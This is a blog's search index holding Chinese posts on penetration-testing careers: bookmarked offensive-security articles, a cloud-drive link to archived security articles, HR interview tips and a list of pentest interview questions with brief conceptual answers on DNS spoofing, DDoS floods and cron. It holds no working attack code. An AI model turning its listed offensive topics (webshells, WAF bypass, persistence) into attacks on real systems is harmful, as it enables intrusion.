<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>收藏的文章</title>
    <url>/2099/01/01/%E6%94%B6%E8%97%8F%E7%9A%84%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<hr><ul>
<li>未来一定很美好！请继续加油！</li>
</ul><a id="more"></a>

<hr>
<hr>
<hr>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247484190&idx=1&sn=049bd6024b68d5f784da6f4666eab62d&chksm=9aced381adb95a97df3846e7f1b1f06d9ddfe2a8c7ece77f6398da5d414375e18021e35073e7&mpshare=1&scene=1&srcid=&sharer_sharetime=1573351062520&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=5755ace7bbc19e498d09038a9c097dc8ba07cd870c05a3d4e20fecb90c62f0bf2fc3dd6118c3d710cace6ccc4a0ee95a2da81e5353d0111db27cb5772bb2d683f9bcb8e27620ebc66e1281fae2a690da&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10&version=62070158&lang=zh_CN&pass_ticket=8sY4poyaTvWQPn3fer99trPTEiMV%2BthFTSVyol1UcyDhdSmGcv1pdJQUG0VcJ3vi" target="_blank" rel="noopener">2019年渗透测试思路及面试问题集锦</a></p>
<blockquote>
<p>微信公众号：乌云安全，作者：王大佬</p>
</blockquote>
<p><a href="https://www.freebuf.com/articles/others-articles/207347.html" target="_blank" rel="noopener">OSCP认证经验分享</a></p>
<blockquote>
<p>平台：FreeBUF，作者：daxin09</p>
</blockquote>
<p><a href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%BB%B4%E6%9D%83.html" target="_blank" rel="noopener">域渗透-域维权</a></p>
<blockquote>
<p>作者：uknow</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247485289&idx=1&sn=5eb0086d0512c20142a7f9d3799149a4&chksm=fc3fbe68cb48377eda2856487d234d15b7ce2997f7dd82cd07453b1d8d946161e8d5f655655f&mpshare=1&scene=1&srcid=&sharer_sharetime=1569889801299&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=5755ace7bbc19e49b3afdbb8409b1faf7ad84dfb18660d585d1c6d21ba3654ffef76852cddfec62e241837e5160d13038d7bc9781fa85c2e669733aac38bf2a0e338a07d0caa999e523b5513d939405f&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10&version=62070136&lang=zh_CN&pass_ticket=WLc2latOSjBN9%2BPOwM1ZKVyjOnkCYBq%2BQtm8ta%2Bg4dqLRWBCgLLZ8RCCN7DBZKGz" target="_blank" rel="noopener">从webshell到域控实战详解</a></p>
<blockquote>
<p>微信公众号：Ms08067安全实验室，作者：徐哥</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448904307&idx=1&sn=2bc6e7d98b027ee1ec1d6ea84e559c8f&chksm=8b55c02ebc22493835408d3975801d62631c432bc21a3753fb3b1d5f87847e82f2a7aeccf55c&mpshare=1&scene=1&srcid=&sharer_sharetime=1569679047672&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=c5d0e961d64e3b92378db2d502c63b30021a483ae85f93ae25d8e3a5275866c0b55d76c83e26a869773fb331a8643290dd5e8d476793ec1b5d66779f12de273c5d606d6976967ce53f51260634a92ac4&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10&version=62070136&lang=zh_CN&pass_ticket=Q0nBQ98scPPD%2BPBAqUMCKFt0NkIxsnzptV%2B1ROWhVbqCfzmPdC9yFVxMlPx8OTwa" target="_blank" rel="noopener">三大渗透框架权限维持</a></p>
<blockquote>
<p>微信公众号：Bypass，作者：Bypass</p>
</blockquote>
<p><a href="https://boombao.net/2019/09/23/domain-1/" target="_blank" rel="noopener">域渗透常用姿势总结</a></p>
<blockquote>
<p>作者：tkcharlotte</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIzNzA4NDk3Nw==&mid=2457738181&idx=1&sn=0a204aa85ef7db1df0ff93c178121315&chksm=ff44b39bc8333a8d14adcec4df4c2bd305d67e0711526ade76f54d37a573e8d37efc0c4b64f6&mpshare=1&scene=1&srcid=&sharer_sharetime=1569505276980&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=5755ace7bbc19e493c02ad008cfda80cfeb2e6b3cae5b8936a17a78454a0241edb0e090cc5c1a709bb17e18ada801174c62ba37c68a939e84e46c6577b272500e06bdf549b961fb195b3499a2968afa6&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10&version=62070136&lang=zh_CN&pass_ticket=et5EKPmof18jrbkqqbHeORNYyzOECHuXoS4nCyOLaZhpsfLpziLGlIyQUUKQd8FD" target="_blank" rel="noopener">利用 GitHub 从零开始搭建一个博客
</a></p>
<blockquote>
<p>微信公众号：进击的Coder，作者：崔庆才</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247487887&idx=1&sn=d177572cbfda0b2b3eb5667b7fecb7dd&chksm=ec1f44b0db68cda69f6851fe3675761b2ce29093fe96ad2142517da6cb67c744a3ad460d5424&mpshare=1&scene=1&srcid=&sharer_sharetime=1573085650838&sharer_shareid=874f55ea1fe20d98c42c56d295fd3103&key=effb0e3770c8d430cce2754c0200cd7b3c634c3ad9e6577bbe3858b15b178a259a92d3eef27d99ecf350c800aa19d2cde2c31f00b7d07bbe36c94d2399a9e0fb98d7f097777c47f4c56e9f4463b8f8a3&ascene=1&uin=MTAyNzk4MzMyNA%3D%3D&devicetype=Windows+10&version=62070152&lang=zh_CN&pass_ticket=Wrrno%2FGS%2BBrnVdd8xI7Chw5RRX4WAkYkL47%2FNg0hVGw24NSQEFHyogjGnE24BML6" target="_blank" rel="noopener">Getshell | 文件上传绕过整理
</a></p>
<blockquote>
<p>微信公众号：HACK学习呀，作者：HACK学习</p>
</blockquote>
]]></content>
      <tags>
        <tag>收藏</tag>
      </tags>
  </entry>
  <entry>
    <title>dump下来的文章</title>
    <url>/2019/11/21/dump%E4%B8%8B%E6%9D%A5%E7%9A%84%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<p>看到别人发的，我就又转存到百度云了。<br>里面的文章是来自：</p><a id="more"></a>
<ul>
<li>安全客(2019.1.2-至今) </li>
<li>SoBUG安全平台 </li>
<li>重生信息安全 </li>
<li>安全盒子</li>
</ul>
<p>某大佬dump下来的，怕以后看不到了。。。。。</p>
<p>链接：<a href="https://pan.baidu.com/s/1da1l781b8hBvPKIAAjd8kQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1da1l781b8hBvPKIAAjd8kQ</a><br>提取码：ieol </p>
]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
  <entry>
    <title>个人准备渗透测试和安全面试的经验之谈（1）</title>
    <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%881%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>文章摘选自<br><a href="https://github.com/Leezj9671/Pentest_Interview/blob/master/HR%E9%97%AE%E9%A2%98.md" target="_blank" rel="noopener">https://github.com/Leezj9671/Pentest_Interview/blob/master/HR%E9%97%AE%E9%A2%98.md</a></p>
</blockquote><a id="more"></a>
<ul>
<li><a href="#hr面">HR面</a><ul>
<li><a href="#问题">问题</a><ul>
<li><a href="#对我们公司有什么了解为什么选择本公司">对我们公司有什么了解，为什么选择本公司</a></li>
<li><a href="#为什么想要应聘这个职位">为什么想要应聘这个职位</a></li>
<li><a href="#对安全服务是怎么理解的">对安全服务是怎么理解的</a></li>
<li><a href="#如果我不知道渗透测试两分钟说一下">如果我不知道渗透测试，两分钟说一下</a></li>
<li><a href="#如果我是一个汽车厂商你如何证明你的工作是有意义的">如果我是一个汽车厂商，你如何证明你的工作是有意义的？</a></li>
<li><a href="#作为应届生你如何能胜任该职位">作为应届生，你如何能胜任该职位</a></li>
<li><a href="#你有什么职业规划">你有什么职业规划</a></li>
<li><a href="#如果离职的话是因为什么原因">如果离职的话是因为什么原因</a></li>
<li><a href="#你有什么优缺点">你有什么优缺点</a></li>
<li><a href="#对于薪资的要求">对于薪资的要求</a></li>
<li><a href="#给不了这么多工资可以接受吗为什么想要这个数">给不了这么多工资可以接受吗？为什么想要这个数？</a></li>
<li><a href="#进入部门后你需要多长时间进入项目">进入部门后，你需要多长时间进入项目？</a></li>
<li><a href="#上一个面试的人能力跟你差不多但是工资方面比你要的低">上一个面试的人能力跟你差不多，但是工资方面比你要的低？</a></li>
<li><a href="#是否可以接受加班">是否可以接受加班</a></li>
<li><a href="#沟通能力和领导同事产生分歧会怎么办">（沟通能力）和领导、同事产生分歧会怎么办</a></li>
<li><a href="#工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法">工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</a></li>
<li><a href="#对上司有什么要求喜欢和什么样的领导合作">对上司有什么要求？喜欢和什么样的领导合作？</a></li>
<li><a href="#最有影响的一件事人">最有影响的一件事/人</a></li>
<li><a href="#你还要问什么问题">你还要问什么问题</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="HR面"><a href="#HR面" class="headerlink" title="HR面"></a>HR面</h1><p>注意！HR面试的时候会有非常多的坑，熟悉我在这里写的问题，回答的时候情商高一点，不要跟HR吵起来，也不要有不合时宜的意见分歧，这个度的把控最好自己能让同学、朋友担任面试官，让他们多多挑你的刺，从而不断练习自己的反应能力。技术面试通过的，在HR这边通不过的例子是有很多的！</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="对我们公司有什么了解，为什么选择本公司"><a href="#对我们公司有什么了解，为什么选择本公司" class="headerlink" title="对我们公司有什么了解，为什么选择本公司"></a>对我们公司有什么了解，为什么选择本公司</h3><p>在信息安全行业比较知名，了解过公司的xx产品。（每次面试某个公司，都要花5-10分钟了解该公司的产品）</p>
<h3 id="为什么想要应聘这个职位"><a href="#为什么想要应聘这个职位" class="headerlink" title="为什么想要应聘这个职位"></a>为什么想要应聘这个职位</h3><p>从我的经历上可以很清楚地看到我对网络安全的浓厚兴趣，我认为对本职工作有兴趣的人才能更好地完成这个工作。另外也有一句话说得很棒，“你之所以看不见黑暗，是因为有人拼命把它挡在你看不到的地方”，我认为做信息安全的尤其是渗透测试，就是为了更好地保护用户的安全，防患于未然，也是我想要应聘这个岗位的理由。（不要照背，体现自己的热爱和专业能力）</p>
<h3 id="对安全服务是怎么理解的"><a href="#对安全服务是怎么理解的" class="headerlink" title="对安全服务是怎么理解的"></a>对安全服务是怎么理解的</h3><p>安全服务对象是人， 渗透测试对象是网站。（我的理解）</p>
<ul>
<li>安全概念和资讯</li>
<li>安全工具使用</li>
<li>渗透测试</li>
<li>安全基线检查</li>
<li>应急响应</li>
<li>代码审计</li>
<li>安全边界建设</li>
<li>安全规范 </li>
</ul>
<h3 id="如果我不知道渗透测试，两分钟说一下"><a href="#如果我不知道渗透测试，两分钟说一下" class="headerlink" title="如果我不知道渗透测试，两分钟说一下"></a>如果我不知道渗透测试，两分钟说一下</h3><p>（此处自行组织语言，力求能将渗透测试讲得浅显易懂，时间控制在三分钟以内）</p>
<h3 id="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"><a href="#如果我是一个汽车厂商，你如何证明你的工作是有意义的？" class="headerlink" title="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"></a>如果我是一个汽车厂商，你如何证明你的工作是有意义的？</h3><p>（对于不懂得安全的人来说，怎么能说服他需要进行渗透测试，渗透测试有什么作用）</p>
<h3 id="作为应届生，你如何能胜任该职位"><a href="#作为应届生，你如何能胜任该职位" class="headerlink" title="作为应届生，你如何能胜任该职位"></a>作为应届生，你如何能胜任该职位</h3><p>正如前方所说，我学习能力很强，主观能动性强，能很快地做好下派的任务，所以我认为我能很好地胜任这个职位</p>
<h3 id="你有什么职业规划"><a href="#你有什么职业规划" class="headerlink" title="你有什么职业规划"></a>你有什么职业规划</h3><p>渗透测试工程师-&gt;渗透测试项目负责人-&gt;安全架构师（安全咨询顾问）</p>
<h3 id="如果离职的话是因为什么原因"><a href="#如果离职的话是因为什么原因" class="headerlink" title="如果离职的话是因为什么原因"></a>如果离职的话是因为什么原因</h3><p>个人规划和公司有冲突，缺少上升空间。（就算是因为钱少、和同事 <del>打架</del> 不和，也不要明说……）</p>
<h3 id="你有什么优缺点"><a href="#你有什么优缺点" class="headerlink" title="你有什么优缺点"></a>你有什么优缺点</h3><ul>
<li>优点：对网络安全十分热爱，抗压能力强，学习能力强，责任感强</li>
<li>缺点：遇到技术难点时可能会一直钻研，可能会耽搁到其它事情 （情商高一点，不要真的说自己的缺点）</li>
</ul>
<h3 id="对于薪资的要求"><a href="#对于薪资的要求" class="headerlink" title="对于薪资的要求"></a>对于薪资的要求</h3><p>月薪13-15K，可以接受1k的浮动</p>
<h3 id="给不了这么多工资可以接受吗？为什么想要这个数？"><a href="#给不了这么多工资可以接受吗？为什么想要这个数？" class="headerlink" title="给不了这么多工资可以接受吗？为什么想要这个数？"></a>给不了这么多工资可以接受吗？为什么想要这个数？</h3><ol>
<li>贵公司和我其实比较契合，我可以接受月薪1k左右的浮动。（表明自己的接受范围和立场）</li>
<li>可能我某些方面表现得不够好或者表达不清晰，让您觉得我的能力不够。您可以根据这些点再问我几个问题。（表明自己对自身的判断，认为自己值得这个数，委婉提示面试官可能判断有误）</li>
<li>通过贵司的招聘信息和整个市场平均水平看，我认为我岗位匹配度比较好，值得这个工资水平。（明确回答，要有自信）<br>（这个问题千万不要顶嘴或拍桌走人，可参考我的知乎回答 面试想拿 10K，HR 说你只值 7K，该怎样回答或者反驳？ - 李与归的回答 - 知乎 <a href="https://www.zhihu.com/question/282880854/answer/432987673" target="_blank" rel="noopener">https://www.zhihu.com/question/282880854/answer/432987673</a> ）</li>
</ol>
<h3 id="进入部门后，你需要多长时间进入项目？"><a href="#进入部门后，你需要多长时间进入项目？" class="headerlink" title="进入部门后，你需要多长时间进入项目？"></a>进入部门后，你需要多长时间进入项目？</h3><p>（表达自己的快速学习能力）</p>
<h3 id="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"><a href="#上一个面试的人能力跟你差不多，但是工资方面比你要的低？" class="headerlink" title="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"></a>上一个面试的人能力跟你差不多，但是工资方面比你要的低？</h3><p>（表达综合素质方面，比如沟通能力好、领导能力好、文档能力好等等）</p>
<h3 id="是否可以接受加班"><a href="#是否可以接受加班" class="headerlink" title="是否可以接受加班"></a>是否可以接受加班</h3><p>加班肯定是不可避免的，我可以接受项目需求的加班，毕竟完成工作是员工所要尽到的责任。同时我也会提高自己的工作效率，配合完成工作。（同样的，情商高一点，口头说要加班，入职之后要不要加班不就是……:&gt;）</p>
<h3 id="（沟通能力）和领导、同事产生分歧会怎么办"><a href="#（沟通能力）和领导、同事产生分歧会怎么办" class="headerlink" title="（沟通能力）和领导、同事产生分歧会怎么办"></a>（沟通能力）和领导、同事产生分歧会怎么办</h3><p>出现分歧是十分正常的事情，产生分歧很有可能是双方理解不一样，如何有效沟通、相互理解才是重中之重。在我看来还是会以大局出发，以有益于公司和客户的方向出发。</p>
<h3 id="工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法"><a href="#工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法" class="headerlink" title="工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法"></a>工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</h3><p>我在找工作之前，都会了解好这份工作的具体职责，如果我工作一段时间后发现工作不是想象中的，那只能说明我的职业目标不够清晰。（圆滑点）</p>
<h3 id="对上司有什么要求？喜欢和什么样的领导合作？"><a href="#对上司有什么要求？喜欢和什么样的领导合作？" class="headerlink" title="对上司有什么要求？喜欢和什么样的领导合作？"></a>对上司有什么要求？喜欢和什么样的领导合作？</h3><p>我来求职都是为了能找到一个希望能提升自己的平台，我希望更能找到一个技术经验丰富的领导。</p>
<h3 id="最有影响的一件事-人"><a href="#最有影响的一件事-人" class="headerlink" title="最有影响的一件事/人"></a>最有影响的一件事/人</h3><p>（最好是在安全领域方面的，说上一些黑客事件，表明自己热爱安全领域）</p>
<h3 id="你还要问什么问题"><a href="#你还要问什么问题" class="headerlink" title="你还要问什么问题"></a>你还要问什么问题</h3><ul>
<li>有没有岗位晋升机制，入职培训项目，员工培训提升项目？考证有没有报销？</li>
<li>五险一金、社保比例、饭补、餐补、交通补助？</li>
<li>应聘岗位具体职责和工作内容？会不会经常出差？</li>
<li>试用期多久？薪水多少？</li>
</ul>
]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>个人准备渗透测试和安全面试的经验之谈（2）</title>
    <url>/2019/11/11/%E4%B8%AA%E4%BA%BA%E5%87%86%E5%A4%87%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%92%8C%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E7%9A%84%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88%EF%BC%882%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>文章摘选自<br><a href="https://github.com/Leezj9671/Pentest_Interview/blob/master/%E9%83%A8%E5%88%86%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95.md" target="_blank" rel="noopener">https://github.com/Leezj9671/Pentest_Interview/blob/master/%E9%83%A8%E5%88%86%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95.md</a></p>
</blockquote><a id="more"></a>
<ul>
<li><a href="#面试问题记录">面试问题记录</a><ul>
<li><a href="#360">360</a><ul>
<li><a href="#sql的存储引擎">SQL的存储引擎</a></li>
<li><a href="#sql注入写shell的条件用法">SQL注入写shell的条件，用法</a></li>
<li><a href="#gpc是什么开启了怎么绕过">GPC是什么？开启了怎么绕过</a></li>
<li><a href="#mysql一个和两个什么区别">Mysql一个@和两个@什么区别</a></li>
<li><a href="#iis解析漏洞不同版本有什么漏洞还有什么容器解析漏洞">IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞</a></li>
<li><a href="#wireshark抓包数据报经过三层交换机路由的变化nat协议描述地址进入内网怎么变化">wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化</a></li>
<li><a href="#linux计划任务黑客隐藏自己的计划任务会怎么做windows计划任务怎么设定">linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定</a></li>
<li><a href="#挖过最难的漏洞是什么">挖过最难的漏洞是什么</a></li>
</ul>
</li>
<li><a href="#ukelink">ukelink</a><ul>
<li><a href="#病毒和蠕虫的区别">病毒和蠕虫的区别</a></li>
<li><a href="#dns欺骗是什么">DNS欺骗是什么</a></li>
<li><a href="#DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议">DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议</a></li>
<li><a href="#陆地land攻击是什么">陆地land攻击是什么</a></li>
<li><a href="#xss有什么执行存储型的xss的危害和原理">xss有什么？执行存储型的xss的危害和原理</a></li>
<li><a href="#渗透测试流程不够清晰太浅显">渗透测试流程？（不够清晰，太浅显</a></li>
<li><a href="#有没有移动端的调试经验-apkipa包分析">有没有移动端的调试经验 apk,ipa包分析</a></li>
<li><a href="#对于云安全的理解">对于云安全的理解</a></li>
<li><a href="#虚拟机逃逸的理解">虚拟机逃逸的理解</a></li>
<li><a href="#英语介绍一下自己">英语介绍一下自己</a></li>
<li><a href="#职业路径">职业路径</a></li>
<li><a href="#大学做过什么相关的事情">大学做过什么相关的事情</a></li>
<li><a href="#在工作会做什么来不断提高自己的能力">在工作会做什么来不断提高自己的能力</a></li>
</ul>
</li>
<li><a href="#卓望">卓望</a><ul>
<li><a href="#渗透测试流程">渗透测试流程</a></li>
<li><a href="#描述渗透项目做了什么">描述渗透项目，做了什么</a></li>
<li><a href="#xss漏洞类型详情修复方案">xss漏洞类型、详情、修复方案</a></li>
<li><a href="#sql注入原理类型waf绕过写shell提权修复方案">SQL注入原理、类型，waf绕过，写shell，提权，修复方案</a></li>
<li><a href="#终端的渗透经验">终端的渗透经验</a></li>
<li><a href="#了解什么比较新的漏洞">了解什么比较新的漏洞</a></li>
<li><a href="#企业内部安全">企业内部安全</a></li>
</ul>
</li>
<li><a href="#安巽">安巽</a><ul>
<li><a href="#算法了解过什么排序">算法？了解过什么排序？</a></li>
<li><a href="#爬虫">爬虫</a><ul>
<li><a href="#页面存在很多js的时候用什么">页面存在很多js的时候，用什么</a></li>
<li><a href="#爬虫的待爬取url量级比较大的时候如何对其去重">爬虫的待爬取URL量级比较大的时候，如何对其去重</a></li>
<li><a href="#多线程-异步-协程-多路复用-用哪一个最快-为什么">多线程 异步 协程 多路复用 用哪一个最快 为什么</a></li>
</ul>
</li>
<li><a href="#浏览器的常用编码">浏览器的常用编码</a></li>
<li><a href="#web常用的加密算法有什么">web常用的加密算法有什么</a></li>
<li><a href="#有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？">有没有内网渗透的经验？怎么渗透？如果拿下了边界层的某一个机器，如何对内网其他进行探测？</a></li>
<li><a href="#mysql中like查询会会非常缓慢如何进行优化">mysql中like查询会会非常缓慢，如何进行优化</a></li>
<li><a href="#做了cdn的网站如何获取真实ip">做了cdn的网站如何获取真实IP</a></li>
<li><a href="#渗透的时候如何隐藏自己的身份">渗透的时候如何隐藏自己的身份</a></li>
<li><a href="#主机疑似遭到入侵要看哪里的日志">主机疑似遭到入侵，要看哪里的日志</a></li>
<li><a href="#sql注入漏洞怎么修复">SQL注入漏洞怎么修复</a></li>
</ul>
</li>
<li><a href="#长亭">长亭</a><ul>
<li><a href="#安全研究的方面做过哪些渗透测试的工作">安全研究的方面？做过哪些渗透测试的工作？</a></li>
<li><a href="#只给你一个网址如何进行渗透测试">只给你一个网址，如何进行渗透测试</a></li>
<li><a href="#SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？">SQL注入，id=1如何检测？order by怎么利用？limit语句怎么利用？盲注有什么？</a></li>
<li><a href="#sleep被禁用后还能怎么进行sql注入">sleep被禁用后还能怎么进行sql注入</a></li>
<li><a href="#xss可以控制属性怎么利用">XSS可以控制属性怎么利用</a></li>
<li><a href="#csrf怎么防护">CSRF怎么防护？</a></li>
<li><a href="#请求头中哪些是有危害的">请求头中哪些是有危害的？</a></li>
<li><a href="#XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过">XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过</a></li>
<li><a href="#java中间件的漏洞举几个例子">JAVA中间件的漏洞，举几个例子？</a></li>
<li><a href="#iis常见的漏洞">IIS常见的漏洞</a></li>
<li><a href="#python有哪些框架其中出现过哪些漏洞">python有哪些框架，其中出现过哪些漏洞</a></li>
<li><a href="#业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？">业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？</a></li>
<li><a href="#PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？">PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？</a></li>
<li><a href="#HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie">HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie</a></li>
</ul>
</li>
<li><a href="#盛邦">盛邦</a><ul>
<li><a href="#有没有做过协议分析和抓包分析">有没有做过协议分析和抓包分析</a></li>
</ul>
</li>
<li><a href="#翼果">翼果</a><ul>
<li><a href="#mysql查看版本">mysql查看版本？</a></li>
<li><a href="#过安全狗">过安全狗</a></li>
<li><a href="#编程能力平台逆向修改程序入口rootkit有没有研究过">编程能力/平台逆向/修改程序入口/rootkit有没有研究过</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="面试问题记录"><a href="#面试问题记录" class="headerlink" title="面试问题记录"></a>面试问题记录</h1><blockquote>
<p>CONTACT ME: github.com/leezj9671</p>
</blockquote>
<h2 id="360"><a href="#360" class="headerlink" title="360"></a>360</h2><h3 id="SQL的存储引擎"><a href="#SQL的存储引擎" class="headerlink" title="SQL的存储引擎"></a>SQL的存储引擎</h3><h3 id="SQL注入写shell的条件，用法"><a href="#SQL注入写shell的条件，用法" class="headerlink" title="SQL注入写shell的条件，用法"></a>SQL注入写shell的条件，用法</h3><h3 id="GPC是什么？开启了怎么绕过"><a href="#GPC是什么？开启了怎么绕过" class="headerlink" title="GPC是什么？开启了怎么绕过"></a>GPC是什么？开启了怎么绕过</h3><h3 id="Mysql一个-和两个-什么区别"><a href="#Mysql一个-和两个-什么区别" class="headerlink" title="Mysql一个@和两个@什么区别"></a>Mysql一个@和两个@什么区别</h3><h3 id="IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞"><a href="#IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞" class="headerlink" title="IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞"></a>IIS解析漏洞，不同版本有什么漏洞，还有什么容器解析漏洞</h3><h3 id="wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化"><a href="#wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化" class="headerlink" title="wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化"></a>wireshark抓包，数据报经过三层交换机、路由的变化，NAT协议描述，地址进入内网怎么变化</h3><h3 id="linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定"><a href="#linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定" class="headerlink" title="linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定"></a>linux计划任务，黑客隐藏自己的计划任务会怎么做。windows计划任务怎么设定</h3><p>三种主要的at batch cron，一般使用cron在规定的时间执行命令</p>
<h3 id="挖过最难的漏洞是什么"><a href="#挖过最难的漏洞是什么" class="headerlink" title="挖过最难的漏洞是什么"></a>挖过最难的漏洞是什么</h3><h2 id="ukelink"><a href="#ukelink" class="headerlink" title="ukelink"></a>ukelink</h2><h3 id="病毒和蠕虫的区别"><a href="#病毒和蠕虫的区别" class="headerlink" title="病毒和蠕虫的区别"></a>病毒和蠕虫的区别</h3><h3 id="DNS欺骗是什么"><a href="#DNS欺骗是什么" class="headerlink" title="DNS欺骗是什么"></a>DNS欺骗是什么</h3><p>定义： DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</p>
<h3 id="DDOS有哪些-CC攻击是什么-区别是什么-在哪一个层面-什么协议"><a href="#DDOS有哪些-CC攻击是什么-区别是什么-在哪一个层面-什么协议" class="headerlink" title="DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议"></a>DDOS有哪些,CC攻击是什么,区别是什么,在哪一个层面,什么协议</h3><p>SYN攻击 防火墙、特征匹配<br>ACK FLOOD<br>UDP FLOOD<br>ICMP FLOOD<br>CC http的get请求<br>陆地攻击 源IP和目的IP都为同一个<br>UDP DNS QUERY 向被攻击的服务器发送大量的域名解析请求，通常请求解析的域名是随机生成或者是网络世界上根本不存在的域名，被攻击的DNS 服务器在接收到域名解析请求的时候首先会在服务器上查找是否有对应的缓存，如果查找不到并且该域名无法直接由服务器解析的时候，DNS 服务器会向其上层DNS服务器递归查询域名信息</p>
<h3 id="陆地land攻击是什么"><a href="#陆地land攻击是什么" class="headerlink" title="陆地land攻击是什么"></a>陆地land攻击是什么</h3><h3 id="xss有什么？执行存储型的xss的危害和原理"><a href="#xss有什么？执行存储型的xss的危害和原理" class="headerlink" title="xss有什么？执行存储型的xss的危害和原理"></a>xss有什么？执行存储型的xss的危害和原理</h3><h3 id="渗透测试流程？（不够清晰，太浅显"><a href="#渗透测试流程？（不够清晰，太浅显" class="headerlink" title="渗透测试流程？（不够清晰，太浅显"></a>渗透测试流程？（不够清晰，太浅显</h3><h3 id="有没有移动端的调试经验-apk-ipa包分析"><a href="#有没有移动端的调试经验-apk-ipa包分析" class="headerlink" title="有没有移动端的调试经验 apk,ipa包分析"></a>有没有移动端的调试经验 apk,ipa包分析</h3><h3 id="对于云安全的理解"><a href="#对于云安全的理解" class="headerlink" title="对于云安全的理解"></a>对于云安全的理解</h3><p>权限管理，内网威胁，信息泄露，过于依赖托管厂商</p>
<h3 id="虚拟机逃逸的理解"><a href="#虚拟机逃逸的理解" class="headerlink" title="虚拟机逃逸的理解"></a>虚拟机逃逸的理解</h3><p>虚拟机之间通信或上层主机的通信</p>
